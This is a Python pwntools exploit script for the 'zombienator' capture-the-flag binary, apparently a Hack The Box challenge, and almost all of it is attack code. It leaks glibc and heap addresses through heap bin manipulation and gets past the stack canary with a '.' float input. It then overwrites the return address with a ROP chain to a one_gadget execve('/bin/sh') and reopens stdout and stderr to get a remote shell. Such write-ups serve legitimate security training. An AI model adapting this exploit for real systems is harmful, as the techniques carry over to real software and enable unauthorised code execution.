from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)



# Specify your GDB script here for debugging
gdbscript = '''
b *display +213
b *attack +185
b *attack +240
continue
c
c
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './zombienator'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
glibc = ELF('./glibc/libc.so.6', checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'


def hex_to_double(value):
    value = p64(value).hex()
    log.info(f'LE value: {value}')
    value = struct.unpack('d', bytes.fromhex(value))[0]
    return str(value)

# size: must be between 1 and 130
# position: must be between 0 and 9
def create_zombienator(size, position):
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'tier:', size)
    io.sendlineafter(b'(5-9):', position)

# position: must be between 0 and 9
def remove_zombienator(position):
    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b'position:', position)

def display_zombienator():
    io.sendlineafter(b'>>', b'3')

def init_attack(n_attacks):
    io.sendlineafter(b'>>', b'4')
    io.sendlineafter(b'attacks:', n_attacks)

io = start()


#################################################
# GLIBC LEAK
#################################################

create_zombienator(b'130', b'0')
create_zombienator(b'130', b'1')
create_zombienator(b'130', b'2')
create_zombienator(b'130', b'3')
create_zombienator(b'130', b'4')
create_zombienator(b'130', b'5')
create_zombienator(b'130', b'6')
create_zombienator(b'130', b'7')
create_zombienator(b'130', b'8')

# Fill tcachebin list so next chunk goes to unsortedbin
remove_zombienator(b'0')
remove_zombienator(b'1')
remove_zombienator(b'2')
remove_zombienator(b'3')
remove_zombienator(b'4')
remove_zombienator(b'5')
remove_zombienator(b'6')

# This chunk goes to unsortedbin 
remove_zombienator(b'7')

# Now unsortedbin points to glibc so we can get a glibc leak :)
display_zombienator()

io.recvuntil(b'Slot [7]:')
glibc_unsortedbin_leak = u64(io.recvline().strip().ljust(8, b'\x00'))
log.success(f'Leaked unsortedbin glibc address: {hex(glibc_unsortedbin_leak)}')

glibc.address = glibc_unsortedbin_leak - 0x219ce0 # computed from other libc offsets
log.success(f'Computed glibc base address: {hex(glibc.address)}')

# Clean resting chuncks
remove_zombienator(b'8')

#################################################
# HEAP LEAK
#################################################

# Malloc min size slot
create_zombienator(b'24', b'0')

remove_zombienator(b'0')

# Leak heap base address from tcachebin fd (forward pointer)
display_zombienator()

io.recvuntil(b'Slot [0]:')
heap_base_address = u64(io.recvline().strip().ljust(8, b'\x00')) << 12
log.success(f'Leaked heap base address: {hex(heap_base_address)}')


#################################################
# ROP
#################################################

init_attack(b'38')
for i in range(33):
    io.sendlineafter(b'coordinates:', b'5.00')


# '.' doesn't modify the current stack value so canary can be bypassed.
io.sendlineafter(b'coordinates:', b'.')

# Some junk
io.sendlineafter(b'coordinates:', b'5.00')

# Overwrite RIP
# https://gregstoll.com/~gregstoll/floattohex/ # Not useful in this case as PIE is active but it is good to check for static values.
# Also check HTB bad grades challenge
# one_gadget:
# 0xebc81 execve("/bin/sh", r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

pop_rbp_ret = glibc.address + 0x2a2e0
one_gadget = glibc.address + 0xebc81


io.sendlineafter(b'coordinates:', hex_to_double(pop_rbp_ret))
io.sendlineafter(b'coordinates:', hex_to_double(heap_base_address + 0x20 + 0x78)) # Cleaned chunk part
io.sendlineafter(b'coordinates:', hex_to_double(one_gadget))

sleep(2)

# We have a shell, however it is blind as stdout and stderr are closed.
# https://stackoverflow.com/questions/30968734/reopen-stdout-and-stderr-after-closing-them
# We can just reopen stdout and stderr again.
io.sendline(b'exec 1>&0')
io.sendline(b'exec 2>&0')


io.interactive()
